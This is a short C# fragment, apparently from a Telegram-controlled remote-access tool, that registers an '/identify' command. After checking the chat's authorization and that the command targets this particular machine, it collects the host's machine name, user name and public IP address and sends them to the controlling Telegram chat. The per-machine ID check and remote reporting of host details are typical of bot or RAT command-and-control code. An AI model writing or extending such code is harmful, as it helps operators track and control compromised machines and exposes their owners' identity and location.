Commands.Register("/identify", async (message, args) =>
{
    if (!auth.CheckAuth(message.Chat.Id)) return;

    if (!auth.IsItMyID(args[0])) return;

    var identifierDict = await identifiers.RetrieveMachineIdentifiersAsync();

    string funny = $"🖥️ Identifiers\nMachine Name - {identifierDict["MachineName"]}\nUser Name - {identifierDict["UserName"]}\nPublic IP Address - {identifierDict["PublicIP"]}";

    await BotClient.SendMessage(message.Chat.Id, funny);
});
